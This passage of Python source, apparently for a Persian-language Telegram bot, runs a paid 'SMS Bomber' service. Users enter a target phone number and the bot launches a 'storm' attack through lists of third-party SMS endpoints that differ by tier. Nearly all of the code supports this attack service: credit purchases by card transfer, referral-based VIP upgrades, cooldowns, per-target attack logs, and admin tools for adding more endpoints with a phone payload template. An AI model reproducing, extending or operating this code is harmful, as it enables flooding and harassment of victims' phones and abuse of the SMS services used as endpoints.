            f"📊 سطح: {user['tier']}\n"
            f"💰 اعتبار: {user['credits']}\n"
            f"📱 معرفی‌ها: {user['referral_count']}\n\n"
            f"از منوی زیر استفاده کنید:",
            reply_markup=await get_main_keyboard(user_id)
        )

@dp.message(Command("cancel"))
async def cmd_cancel(message: Message, state: FSMContext):
    await state.clear()
    await message.answer("❌ عملیات لغو شد!", reply_markup=await get_main_keyboard(message.from_user.id))

@dp.message(Command("stop"))
async def cmd_stop(message: Message):
    if bomber_engine.is_running:
        bomber_engine.stop()
        await message.answer("⏹️ حمله متوقف شد!")
    else:
        await message.answer("⚠️ هیچ حمله‌ای در حال اجرا نیست!")

# ============================================================
# هندلر SMS Bomber
# ============================================================

@dp.callback_query(F.data == "sms_bomb")
async def sms_bomb_menu(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    
    if await db.is_banned(user_id):
        await callback.answer("🚫 شما مسدود شده‌اید!", show_alert=True)
        return
    
    credits = await db.get_credits(user_id)
    if credits <= 0:
        await callback.message.edit_text(
            "❌ **اعتبار شما کافی نیست!**\n\n"
            f"💰 اعتبار فعلی: {credits}\n\n"
            "برای خرید اعتبار از دکمه زیر استفاده کنید:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="💰 خرید اعتبار", callback_data="buy_credits")],
                [InlineKeyboardButton(text="🔙 بازگشت", callback_data="back_to_menu")]
            ])
        )
        await callback.answer()
        return
    
    can_bomb, remaining, cooldown_msg = await db.check_cooldown(user_id)
    if not can_bomb:
        await callback.message.edit_text(
            f"⏳ {cooldown_msg}\n\n"
            f"⏱️ زمان باقی‌مانده: {format_time(remaining)}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔙 بازگشت", callback_data="back_to_menu")]
            ])
        )
        await callback.answer()
        return
    
    await callback.message.edit_text(
        f"📱 **SMS Bomber**\n\n"
        f"📱 شماره هدف را وارد کنید:\n"
        f"مثال: `09123456789`\n\n"
        f"⚠️ هر بمب **۱ اعتبار** مصرف می‌کند.\n"
        f"💰 اعتبار شما: {credits}\n\n"
        f"📊 سطح شما: {await db.get_user_tier(user_id)}\n"
        f"📌 اندپوینت‌ها: {len(endpoint_manager.get_endpoints_for_tier(await db.get_user_tier(user_id)))} عدد\n\n"
        f"برای لغو /cancel",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 بازگشت", callback_data="back_to_menu")]
        ])
    )
    await state.set_state(BombState.waiting_for_phone)
    await callback.answer()

@dp.message(BombState.waiting_for_phone)
async def handle_phone(message: Message, state: FSMContext):
    user_id = message.from_user.id
    phone = message.text.strip()
    
    if not is_valid_phone(phone):
        await message.reply_text("❌ شماره نامعتبر! لطفاً یک شماره ۱۰ رقمی وارد کنید.\nمثال: `09123456789`")
        return
    
    if phone.startswith('0'):
        phone = phone[1:]
    
    credits = await db.get_credits(user_id)
    if credits <= 0:
        await message.reply_text("❌ اعتبار شما کافی نیست!")
        await state.clear()
        return
    
    can_bomb, remaining, cooldown_msg = await db.check_cooldown(user_id)
    if not can_bomb:
        await message.reply_text(f"⏳ {cooldown_msg}")
        await state.clear()
        return
    
    tier = await db.get_user_tier(user_id)
    endpoints = endpoint_manager.get_endpoints_for_tier(tier)
    
    if not endpoints:
        await message.reply_text("❌ هیچ اندپوینتی در دسترس نیست!")
        await state.clear()
        return
    
    if not await db.spend_credit(user_id, 1):
        await message.reply_text("❌ خطا در کسر اعتبار!")
        await state.clear()
        return
    
    msg = await message.reply_text(
        f"🚀 **شروع حمله به {phone}...**\n"
        f"📊 تعداد اندپوینت: {len(endpoints)}\n"
        f"⭐ سطح: {tier}\n"
        f"⏳ لطفاً صبر کنید...\n"
        f"⚠️ برای توقف /stop"
    )
    
    await db.update_last_bomb_time(user_id)
    
    def on_result(result):
        asyncio.create_task(handle_bomb_result(message, result, phone, msg, user_id))
    
    bomber_engine.run_bomb(
        endpoints=endpoints,
        phone=phone,
        callback=None,
        mode="storm",
        on_complete=on_result
    )
    
    await state.clear()

async def handle_bomb_result(message: Message, result: dict, phone: str, status_msg: Message, user_id: int):
    await db.log_bomb(
        user_id=user_id,
        target_phone=phone,
        endpoints_used=result['total'],
        success_count=result['success'],
        failed_count=result['failed'] + result['errors']
    )
    
    new_credits = await db.get_credits(user_id)
    
    msg = f"""
✅ **حمله به {phone} کامل شد!**

📊 **نتایج:**
• مجموع: {result['total']}
• ✅ موفق: {result['success']}
• ❌ ناموفق: {result['failed']}
• ⚠️ خطا: {result['errors']}

💰 اعتبار باقی‌مانده: {new_credits}
    """
    
    await status_msg.edit_text(msg, reply_markup=await get_main_keyboard(user_id))

# ============================================================
# هندلر پروفایل
# ============================================================

@dp.callback_query(F.data == "profile")
async def show_profile(callback: CallbackQuery):
    user_id = callback.from_user.id
    user = await db.get_user(user_id)
    if not user:
        await callback.answer("❌ کاربر یافت نشد!")
        return
    
    stats = await db.get_user_stats(user_id)
    
    tier_emojis = {'Free': '🆓', 'VIP': '⭐', 'Pro': '💎'}
    tier_emoji = tier_emojis.get(user['tier'], '🆓')
    
    msg = f"""
👤 **پروفایل شما**

🆔 شناسه: `{user_id}`
👤 نام: {user.get('first_name', '')}
⭐ سطح: {tier_emoji} {user['tier']}
💰 اعتبار: {user['credits']}
📱 معرفی‌ها: {user['referral_count']}
📊 کل بمب‌ها: {stats['total_bombs']}
✅ موفق: {stats['total_success']}
❌ ناموفق: {stats['total_failed']}
📅 تاریخ ثبت‌نام: {user['registered_at'][:10]}

📌 **سقف اندپوینت:** {TIER_LIMITS.get(user['tier'], 30)}
⏱️ **زمان انتظار:** {TIER_COOLDOWNS.get(user['tier'], 300)//60} دقیقه
    """
    
    keyboard = [
        [InlineKeyboardButton(text="🔄 بروزرسانی", callback_data="profile")],
        [InlineKeyboardButton(text="📋 تاریخچه بمب‌ها", callback_data="bomb_history")],
        [InlineKeyboardButton(text="🔙 بازگشت", callback_data="back_to_menu")]
    ]
    
    await callback.message.edit_text(msg, reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
    await callback.answer()

@dp.callback_query(F.data == "bomb_history")
async def show_bomb_history(callback: CallbackQuery):
    user_id = callback.from_user.id
    history = await db.get_bomb_history(user_id, limit=10)
    
    if not history:
        await callback.message.edit_text(
            "📋 هنوز هیچ بمبی ارسال نکرده‌اید!",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔙 بازگشت", callback_data="profile")]
            ])
        )
        await callback.answer()
        return
    
    msg = "📋 **تاریخچه آخرین بمب‌ها:**\n\n"
    for h in history:
        msg += f"📱 {h['target_phone']}\n"
        msg += f"✅ {h['success_count']} موفق | ❌ {h['failed_count']} ناموفق\n"
        msg += f"📅 {h['created_at'][:16]}\n"
        msg += "─────────────\n"
    
    keyboard = [
        [InlineKeyboardButton(text="🔙 بازگشت", callback_data="profile")]
    ]
    
    await callback.message.edit_text(msg, reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
    await callback.answer()

# ============================================================
# هندلر سیستم معرفی
# ============================================================

@dp.callback_query(F.data == "referral")
async def show_referral(callback: CallbackQuery):
    user_id = callback.from_user.id
    referral_link = await db.get_referral_link(user_id)
    referral_count = await db.get_referral_count(user_id)
    
    progress = min(referral_count, 3)
    progress_bar = "█" * progress + "░" * (3 - progress)
    is_vip = await db.get_user_tier(user_id) == 'VIP'
    
    if is_vip:
        status = "✅ **شما قبلاً به VIP ارتقا یافته‌اید!**"
    else:
        status = f"⭐ **ارتقا به VIP:**\nپیشرفت: [{progress_bar}] {progress}/3"
    
    msg = f"""
🔗 **سیستم معرفی**

📱 لینک معرفی شما:
`{referral_link}`

📊 تعداد معرفی‌ها: {referral_count}

{status}

💡 با معرفی ۳ کاربر به VIP ارتقا می‌یابید!
✨ مزایای VIP:
• ۸۰ اندپوینت
• ۳ دقیقه زمان انتظار
    """
    
    keyboard = [
        [InlineKeyboardButton(text="📋 لیست معرفی‌ها", callback_data="referral_list")],
        [InlineKeyboardButton(text="🔙 بازگشت", callback_data="back_to_menu")]
    ]
    
    await callback.message.edit_text(msg, reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
    await callback.answer()

@dp.callback_query(F.data == "referral_list")
async def show_referral_list(callback: CallbackQuery):
    user_id = callback.from_user.id
    referrals = await db.get_referral_list(user_id)
    
    if not referrals:
        await callback.message.edit_text(
            "📋 هنوز کسی را معرفی نکرده‌اید!",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔙 بازگشت", callback_data="referral")]
            ])
        )
        await callback.answer()
        return
    
    msg = "📋 **لیست کاربرانی که معرفی کرده‌اید:**\n\n"
    for r in referrals[:10]:
        name = r.get('first_name', '') or r.get('username', 'کاربر')
        msg += f"👤 {name}\n"
        msg += f"📅 {r['registered_at'][:10]}\n"
        msg += "─────────────\n"
    
    if len(referrals) > 10:
        msg += f"\nو {len(referrals) - 10} کاربر دیگر..."
    
    keyboard = [
        [InlineKeyboardButton(text="🔙 بازگشت", callback_data="referral")]
    ]
    
    await callback.message.edit_text(msg, reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
    await callback.answer()

# ============================================================
# هندلر خرید اعتبار
# ============================================================

@dp.callback_query(F.data == "buy_credits")
async def buy_credits_menu(callback: CallbackQuery):
    keyboard = []
    for key, package in CREDIT_PACKAGES.items():
        keyboard.append([
            InlineKeyboardButton(
                text=f"📦 {package['label']}",
                callback_data=f"buy_package_{key}"
            )
        ])
    keyboard.append([InlineKeyboardButton(text="🔙 بازگشت", callback_data="back_to_menu")])
    
    await callback.message.edit_text(
        "💰 **خرید اعتبار**\n\n"
        "بسته مورد نظر را انتخاب کنید:\n"
        "پس از انتخاب، اسکرین‌شات پرداخت را ارسال کنید.\n\n"
        "📌 **راهنمای پرداخت:**\n"
        "۱. مبلغ را به شماره کارت زیر واریز کنید:\n"
        "`6037-9918-1234-5678`\n"
        "۲. اسکرین‌شات را ارسال کنید\n"
        "۳. پس از تأیید ادمین، اعتبار اضافه می‌شود",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard)
    )
    await callback.answer()

@dp.callback_query(F.data.startswith("buy_package_"))
async def select_package(callback: CallbackQuery, state: FSMContext):
    package_key = callback.data.replace("buy_package_", "")
    package = CREDIT_PACKAGES.get(package_key)
    
    if not package:
        await callback.answer("❌ بسته نامعتبر!")
        return
    
    await state.update_data(package=package_key, amount=package['amount'])
    
    await callback.message.edit_text(
        f"📦 **بسته {package['label']}**\n\n"
        f"💰 مبلغ: {package['price']:,} تومان\n"
        f"📱 اعتبار: {package['amount']} بمب\n\n"
        "📸 **لطفاً اسکرین‌شات پرداخت را ارسال کنید:**\n\n"
        "💳 شماره کارت: `6037-9918-1234-5678`\n"
        "👤 به نام: `حسین محمدی`\n\n"
        "برای لغو /cancel",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 بازگشت", callback_data="buy_credits")]
        ])
    )
    await state.set_state(PaymentState.waiting_for_screenshot)
    await callback.answer()

@dp.message(PaymentState.waiting_for_screenshot)
async def handle_payment_screenshot(message: Message, state: FSMContext):
    user_id = message.from_user.id
    
    if not message.photo:
        await message.reply_text("❌ لطفاً یک عکس (اسکرین‌شات) ارسال کنید!\nبرای لغو /cancel")
        return
    
    data = await state.get_data()
    package_key = data.get('package')
    amount = data.get('amount')
    
    if not package_key or not amount:
        await message.reply_text("❌ خطا در اطلاعات! لطفاً دوباره تلاش کنید.")
        await state.clear()
        return
    
    photo = message.photo[-1]
    file = await bot.get_file(photo.file_id)
    
    os.makedirs("payments/pending", exist_ok=True)
    filename = f"payments/pending/payment_{user_id}_{int(datetime.now().timestamp())}.jpg"
    await bot.download_file(file.file_path, filename)
    
    request_id = await db.add_payment_request(user_id, package_key, amount, filename)
    
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_photo(
                admin_id,
                photo=FSInputFile(filename),
                caption=f"📋 **درخواست پرداخت جدید**\n\n🆔 #{request_id}\n👤 کاربر: {message.from_user.first_name} (@{message.from_user.username})\n🆔 کاربر: {user_id}\n📦 بسته: {package_key}\n💰 مبلغ: {amount:,} تومان\n\nبرای تأیید یا رد، از پنل مدیریت استفاده کنید."
            )
        except:
            pass
    
    await message.reply_text(
        "✅ **اسکرین‌شات شما با موفقیت ارسال شد!**\n\n"
        "⏳ درخواست شما در انتظار تأیید ادمین است.\n"
        "پس از تأیید، اعتبار به حساب شما اضافه می‌شود.",
        reply_markup=await get_main_keyboard(user_id)
    )
    await state.clear()

# ============================================================
# هندلر آمار
# ============================================================

@dp.callback_query(F.data == "stats")
async def user_stats(callback: CallbackQuery):
    user_id = callback.from_user.id
    stats = await db.get_user_stats(user_id)
    
    tier_emoji = {'Free': '🆓', 'VIP': '⭐', 'Pro': '💎'}.get(stats['tier'], '🆓')
    
    msg = f"""
📊 **آمار شما**

⭐ سطح: {tier_emoji} {stats['tier']}
💰 اعتبار: {stats['credits']}
📱 معرفی‌ها: {stats['referral_count']}

📱 **بمب‌ها:**
• کل ارسال‌ها: {stats['total_bombs']}
• ✅ موفق: {stats['total_success']}
• ❌ ناموفق: {stats['total_failed']}
• 📋 تعداد لاگ‌ها: {stats['total_logs']}
    """
    
    keyboard = [
        [InlineKeyboardButton(text="🔄 بروزرسانی", callback_data="stats")],
        [InlineKeyboardButton(text="🔙 بازگشت", callback_data="back_to_menu")]
    ]
    
    await callback.message.edit_text(msg, reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
    await callback.answer()

# ============================================================
# دکمه بازگشت
# ============================================================

@dp.callback_query(F.data == "back_to_menu")
async def back_to_menu(callback: CallbackQuery):
    user_id = callback.from_user.id
    await callback.message.edit_text("🏠 **منوی اصلی**", reply_markup=await get_main_keyboard(user_id))
    await callback.answer()

# ============================================================
# هندلر پنل مدیریت
# ============================================================

@dp.callback_query(F.data == "admin_panel")
async def admin_panel_menu(callback: CallbackQuery):
    user_id = callback.from_user.id
    if not await AdminPanel.is_admin(user_id):
        await callback.answer("❌ شما دسترسی ادمین ندارید!")
        return
    
    keyboard = await AdminPanel.show_admin_menu(user_id)
    await callback.message.edit_text("⚙️ **پنل مدیریت**\n\nیک گزینه را انتخاب کنید:", reply_markup=keyboard)
    await callback.answer()

@dp.callback_query(F.data == "admin_payments")
async def admin_payments(callback: CallbackQuery):
    user_id = callback.from_user.id
    if not await AdminPanel.is_admin(user_id):
        await callback.answer("❌ شما دسترسی ادمین ندارید!")
        return
    
    payments = await db.get_pending_payments()
    
    if not payments:
        await callback.message.edit_text(
            "📋 هیچ درخواست پرداخت جدیدی وجود ندارد.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔙 بازگشت", callback_data="admin_panel")]
            ])
        )
        await callback.answer()
        return
    
    payment = payments[0]
    keyboard = await AdminPanel.build_payment_keyboard(payment['id'])
    
    msg = f"""
📋 **درخواست پرداخت #{payment['id']}**

👤 کاربر: {payment.get('first_name', '')} (@{payment.get('username', 'نامشخص')})
🆔 شناسه: {payment['user_id']}
📦 بسته: {payment['package']}
💰 مبلغ: {payment['amount']:,} تومان
📅 تاریخ: {payment['created_at']}
🖼️ اسکرین‌شات: {payment['screenshot_path']}

تعداد کل درخواست‌ها: {len(payments)}
    """
    
    await callback.message.edit_text(msg, reply_markup=keyboard)
    await callback.answer()

@dp.callback_query(F.data.startswith("approve_payment_"))
async def approve_payment(callback: CallbackQuery):
    user_id = callback.from_user.id
    if not await AdminPanel.is_admin(user_id):
        await callback.answer("❌ شما دسترسی ادمین ندارید!")
        return
    
    payment_id = int(callback.data.replace("approve_payment_", ""))
    success = await db.approve_payment(payment_id, f"تأیید شده توسط ادمین {user_id}")
    
    if success:
        payment = await db.get_payment_request(payment_id)
        if payment:
            try:
                await bot.send_message(payment['user_id'], f"✅ **پرداخت شما تأیید شد!**\n\n💰 {payment['amount']} اعتبار به حساب شما اضافه شد.\n📦 بسته: {payment['package']}\n\nاز شما متشکریم! 🙏")
            except:
                pass
        await callback.answer("✅ پرداخت تأیید شد!")
    else:
        await callback.answer("❌ خطا در تأیید پرداخت!")
    
    await admin_payments(callback)

@dp.callback_query(F.data.startswith("reject_payment_"))
async def reject_payment(callback: CallbackQuery):
    user_id = callback.from_user.id
    if not await AdminPanel.is_admin(user_id):
        await callback.answer("❌ شما دسترسی ادمین ندارید!")
        return
    
    payment_id = int(callback.data.replace("reject_payment_", ""))
    success = await db.reject_payment(payment_id, f"رد شده توسط ادمین {user_id}")
    
    if success:
        payment = await db.get_payment_request(payment_id)
        if payment:
            try:
                await bot.send_message(payment['user_id'], f"❌ **پرداخت شما رد شد!**\n\nدلیل: اسکرین‌شات نامعتبر یا اطلاعات ناقص.\n\nلطفاً دوباره تلاش کنید.")
            except:
                pass
        await callback.answer("❌ پرداخت رد شد!")
    else:
        await callback.answer("❌ خطا در رد پرداخت!")
    
    await admin_payments(callback)

@dp.callback_query(F.data == "admin_users")
async def admin_users(callback: CallbackQuery):
    user_id = callback.from_user.id
    if not await AdminPanel.is_admin(user_id):
        await callback.answer("❌ شما دسترسی ادمین ندارید!")
        return
    
    users = await db.get_all_users(offset=0, limit=10)
    
    if not users:
        await callback.message.edit_text("📋 هیچ کاربری یافت نشد.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 بازگشت", callback_data="admin_panel")]
        ]))
        await callback.answer()
        return
    
    msg = "👥 **لیست کاربران (صفحه ۱):**\n\n"
    for u in users:
        status = "🚫" if u.get('is_banned', 0) == 1 else "✅"
        tier_emoji = {'Free': '🆓', 'VIP': '⭐', 'Pro': '💎'}.get(u['tier'], '🆓')
        msg += f"{status} 🆔 `{u['user_id']}`\n"
        msg += f"👤 {u.get('first_name', '')} (@{u.get('username', 'نامشخص')})\n"
        msg += f"📊 {tier_emoji} {u['tier']} | 💰 {u['credits']} | 📱 {u['referral_count']}\n"
        msg += "─────────────\n"
    
    keyboard = [
        [InlineKeyboardButton(text="📋 مشاهده کاربر", callback_data="admin_view_user")],
        [InlineKeyboardButton(text="🔙 بازگشت", callback_data="admin_panel")]
    ]
    
    await callback.message.edit_text(msg, reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
    await callback.answer()

@dp.callback_query(F.data == "admin_view_user")
async def admin_view_user(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if not await AdminPanel.is_admin(user_id):
        await callback.answer("❌ شما دسترسی ادمین ندارید!")
        return
    
    await callback.message.edit_text(
        "👤 **مدیریت کاربر**\n\nشناسه کاربر (User ID) را وارد کنید:\nمثال: `123456789`\n\nبرای لغو /cancel",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 بازگشت", callback_data="admin_users")]
        ])
    )
    await state.set_state(AdminState.waiting_for_user_id)
    await callback.answer()

@dp.message(AdminState.waiting_for_user_id)
async def handle_admin_user_id(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if not await AdminPanel.is_admin(user_id):
        await message.reply_text("❌ شما دسترسی ادمین ندارید!")
        await state.clear()
        return
    
    target_id = message.text.strip()
    if not target_id.isdigit():
        await message.reply_text("❌ شناسه نامعتبر! لطفاً یک عدد وارد کنید.")
        return
    
    target_id = int(target_id)
    user = await db.get_user(target_id)
    
    if not user:
        await message.reply_text("❌ کاربری با این شناسه یافت نشد!")
        await state.clear()
        return
    
    keyboard = await AdminPanel.build_user_keyboard(target_id)
    
    msg = f"""
👤 **اطلاعات کاربر**

🆔 شناسه: `{target_id}`
👤 نام: {user.get('first_name', '')} (@{user.get('username', 'نامشخص')})
⭐ سطح: {user['tier']}
💰 اعتبار: {user['credits']}
📱 معرفی‌ها: {user['referral_count']}
🚫 وضعیت: {'مسدود' if user.get('is_banned', 0) == 1 else 'فعال'}
📅 ثبت‌نام: {user['registered_at']}
    """
    
    await message.reply_text(msg, reply_markup=keyboard)
    await state.clear()

@dp.callback_query(F.data.startswith("ban_user_"))
async def ban_user(callback: CallbackQuery):
    admin_id = callback.from_user.id
    if not await AdminPanel.is_admin(admin_id):
        await callback.answer("❌ شما دسترسی ادمین ندارید!")
        return
    
    target_id = int(callback.data.replace("ban_user_", ""))
    
    if target_id in ADMIN_IDS:
        await callback.answer("❌ نمی‌توانید ادمین را بن کنید!")
        return
    
    await db.ban_user(target_id)
    await callback.answer("✅ کاربر با موفقیت بن شد!")
    
    try:
        await bot.send_message(target_id, "🚫 **شما توسط ادمین مسدود شدید!**\n\nبرای اطلاعات بیشتر با پشتیبانی تماس بگیرید.")
    except:
        pass
    
    await admin_view_user_after_action(callback, target_id)

@dp.callback_query(F.data.startswith("unban_user_"))
async def unban_user(callback: CallbackQuery):
    admin_id = callback.from_user.id
    if not await AdminPanel.is_admin(admin_id):
        await callback.answer("❌ شما دسترسی ادمین ندارید!")
        return
    
    target_id = int(callback.data.replace("unban_user_", ""))
    
    await db.unban_user(target_id)
    await callback.answer("✅ بن کاربر با موفقیت برداشته شد!")
    
    try:
        await bot.send_message(target_id, "✅ **بن شما برداشته شد!**\n\nاکنون می‌توانید مجدداً از ربات استفاده کنید.")
    except:
        pass
    
    await admin_view_user_after_action(callback, target_id)

async def admin_view_user_after_action(callback: CallbackQuery, target_id: int):
    user = await db.get_user(target_id)
    if not user:
        await callback.message.edit_text("❌ کاربر یافت نشد!")
        return
    
    keyboard = await AdminPanel.build_user_keyboard(target_id)
    
    msg = f"""
👤 **اطلاعات کاربر (به‌روزرسانی شده)**

🆔 شناسه: `{target_id}`
👤 نام: {user.get('first_name', '')} (@{user.get('username', 'نامشخص')})
⭐ سطح: {user['tier']}
💰 اعتبار: {user['credits']}
📱 معرفی‌ها: {user['referral_count']}
🚫 وضعیت: {'مسدود' if user.get('is_banned', 0) == 1 else 'فعال'}
📅 ثبت‌نام: {user['registered_at']}
    """
    
    await callback.message.edit_text(msg, reply_markup=keyboard)

@dp.callback_query(F.data.startswith("set_credits_"))
async def set_credits_prompt(callback: CallbackQuery, state: FSMContext):
    admin_id = callback.from_user.id
    if not await AdminPanel.is_admin(admin_id):
        await callback.answer("❌ شما دسترسی ادمین ندارید!")
        return
    
    target_id = int(callback.data.replace("set_credits_", ""))
    await state.update_data(target_user_id=target_id)
    
    await callback.message.edit_text(
        f"💰 **تنظیم اعتبار کاربر**\n\n🆔 شناسه: `{target_id}`\n\nمقدار اعتبار جدید را وارد کنید:\n(مثبت = افزایش، منفی = کاهش)\nمثال: `50` یا `-10`\n\nبرای لغو /cancel",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 بازگشت", callback_data=f"admin_view_user_{target_id}")]
        ])
    )
    await state.set_state(AdminState.waiting_for_credits)
    await callback.answer()

@dp.message(AdminState.waiting_for_credits)
async def handle_set_credits(message: Message, state: FSMContext):
    admin_id = message.from_user.id
    if not await AdminPanel.is_admin(admin_id):
        await message.reply_text("❌ شما دسترسی ادمین ندارید!")
        await state.clear()
        return
    
    data = await state.get_data()
    target_id = data.get('target_user_id')
    
    if not target_id:
        await message.reply_text("❌ خطا! لطفاً دوباره تلاش کنید.")
        await state.clear()
        return
    
    try:
        amount = int(message.text.strip())
    except ValueError:
        await message.reply_text("❌ مقدار نامعتبر! لطفاً یک عدد وارد کنید.")
        return
    
    user = await db.get_user(target_id)
    if not user:
        await message.reply_text("❌ کاربر یافت نشد!")
        await state.clear()
        return
    
    new_credits = user['credits'] + amount
    if new_credits < 0:
        await message.reply_text(f"❌ اعتبار نمی‌تواند منفی باشد!\nاعتبار فعلی: {user['credits']}")
        return
    
    if amount > 0:
        await db.add_credits(target_id, amount, f"افزایش توسط ادمین {admin_id}")
    elif amount < 0:
        for _ in range(abs(amount)):
            await db.spend_credit(target_id, 1)
    
    await message.reply_text(
        f"✅ **اعتبار با موفقیت تغییر کرد!**\n\n🆔 کاربر: `{target_id}`\n📊 تغییر: {amount:+}\n💰 اعتبار جدید: {new_credits}"
    )
    
    await state.clear()

@dp.callback_query(F.data == "admin_stats")
async def admin_stats(callback: CallbackQuery):
    user_id = callback.from_user.id
    if not await AdminPanel.is_admin(user_id):
        await callback.answer("❌ شما دسترسی ادمین ندارید!")
        return
    
    stats = await db.get_admin_stats()
    
    msg = f"""
📊 **آمار کلی ربات**

👥 **کاربران:**
• کل کاربران: {stats['total_users']}
• 🆓 رایگان (Free): {stats['free_users']}
• ⭐ ویژه (VIP): {stats['vip_users']}
• 💎 حرفه‌ای (Pro): {stats['pro_users']}
• 🚫 مسدود شده: {stats['banned_users']}

💰 **مالی:**
• کل اعتبار موجود: {stats['total_credits']:,}
• درخواست‌های پرداخت: {stats['pending_payments']}

📱 **بمب‌ها:**
• کل ارسال‌ها: {stats['total_bombs']}
    """
    
    keyboard = [
        [InlineKeyboardButton(text="🔄 بروزرسانی", callback_data="admin_stats")],
        [InlineKeyboardButton(text="🔙 بازگشت", callback_data="admin_panel")]
    ]
    
    await callback.message.edit_text(msg, reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
    await callback.answer()

@dp.callback_query(F.data == "admin_broadcast")
async def admin_broadcast_prompt(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if not await AdminPanel.is_admin(user_id):
        await callback.answer("❌ شما دسترسی ادمین ندارید!")
        return
    
    await callback.message.edit_text(
        "📢 **ارسال پیام همگانی**\n\nمتن پیام را وارد کنید:\n(می‌توانید از Markdown استفاده کنید)\n\nبرای لغو /cancel",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 بازگشت", callback_data="admin_panel")]
        ])
    )
    await state.set_state(AdminState.waiting_for_broadcast)
    await callback.answer()

@dp.message(AdminState.waiting_for_broadcast)
async def handle_broadcast(message: Message, state: FSMContext):
    admin_id = message.from_user.id
    if not await AdminPanel.is_admin(admin_id):
        await message.reply_text("❌ شما دسترسی ادمین ندارید!")
        await state.clear()
        return
    
    broadcast_text = message.text
    users = await db.get_all_users(offset=0, limit=9999)
    
    if not users:
        await message.reply_text("❌ هیچ کاربری برای ارسال وجود ندارد!")
        await state.clear()
        return
    
    sent_count = 0
    failed_count = 0
    
    status_msg = await message.reply_text(f"📢 در حال ارسال پیام به {len(users)} کاربر...")
    
    for user in users:
        try:
            await bot.send_message(user['user_id'], f"📢 **پیام همگانی**\n\n{broadcast_text}", parse_mode="HTML")
            sent_count += 1
        except:
            failed_count += 1
        await asyncio.sleep(0.05)
    
    await status_msg.edit_text(
        f"✅ **پیام همگانی ارسال شد!**\n\n📤 ارسال شده: {sent_count}\n❌ ناموفق: {failed_count}\n📊 کل کاربران: {len(users)}"
    )
    
    await state.clear()

@dp.callback_query(F.data == "admin_endpoints")
async def admin_endpoints(callback: CallbackQuery):
    user_id = callback.from_user.id
    if not await AdminPanel.is_admin(user_id):
        await callback.answer("❌ شما دسترسی ادمین ندارید!")
        return
    
    total = endpoint_manager.get_endpoints_count()
    active = endpoint_manager.get_active_count()
    
    keyboard = [
        [InlineKeyboardButton(text="📋 لیست اندپوینت‌ها", callback_data="admin_list_endpoints")],
        [InlineKeyboardButton(text="➕ اضافه کردن اندپوینت", callback_data="admin_add_endpoint")],
        [InlineKeyboardButton(text="❌ حذف اندپوینت", callback_data="admin_remove_endpoint")],
        [InlineKeyboardButton(text="🔄 فعال‌سازی مجدد", callback_data="admin_reactivate_endpoints")],
        [InlineKeyboardButton(text="🔙 بازگشت", callback_data="admin_panel")]
    ]
    
    await callback.message.edit_text(
        f"📁 **مدیریت اندپوینت‌ها**\n\n📊 تعداد کل: {total}\n✅ فعال: {active}\n❌ غیرفعال: {total - active}\n\nیک گزینه را انتخاب کنید:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard)
    )
    await callback.answer()

@dp.callback_query(F.data == "admin_list_endpoints")
async def admin_list_endpoints(callback: CallbackQuery):
    user_id = callback.from_user.id
    if not await AdminPanel.is_admin(user_id):
        await callback.answer("❌ شما دسترسی ادمین ندارید!")
        return
    
    endpoints = endpoint_manager.get_all_endpoints()
    
    if not endpoints:
        await callback.message.edit_text("📋 هیچ اندپوینتی وجود ندارد!", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 بازگشت", callback_data="admin_endpoints")]
        ]))
        await callback.answer()
        return
    
    msg = "📋 **لیست اندپوینت‌ها:**\n\n"
    for i, e in enumerate(endpoints[:20]):
        status = "✅" if e.get('active', True) else "❌"
        msg += f"{i+1}. {status} **{e.get('name')}**\n"
        msg += f"   📌 {e.get('url')}\n"
    
    if len(endpoints) > 20:
        msg += f"\nو {len(endpoints) - 20} اندپوینت دیگر..."
    
    keyboard = [
        [InlineKeyboardButton(text="🔙 بازگشت", callback_data="admin_endpoints")]
    ]
    
    await callback.message.edit_text(msg, reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
    await callback.answer()

@dp.callback_query(F.data == "admin_add_endpoint")
async def admin_add_endpoint_prompt(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if not await AdminPanel.is_admin(user_id):
        await callback.answer("❌ شما دسترسی ادمین ندارید!")
        return
    
    await callback.message.edit_text(
        "➕ **اضافه کردن اندپوینت جدید**\n\nاطلاعات اندپوینت را به فرمت JSON وارد کنید:\n\n```json\n{\n  \"name\": \"نام اندپوینت\",\n  \"url\": \"https://example.com/api\",\n  \"method\": \"POST\",\n  \"headers\": {\"Content-Type\": \"application/json\"},\n  \"payload\": {\"phone\": \"{phone}\"},\n  \"type\": \"json\",\n  \"active\": true\n}\n```\n\nبرای لغو /cancel",
        parse_mode="Markdown"
    )
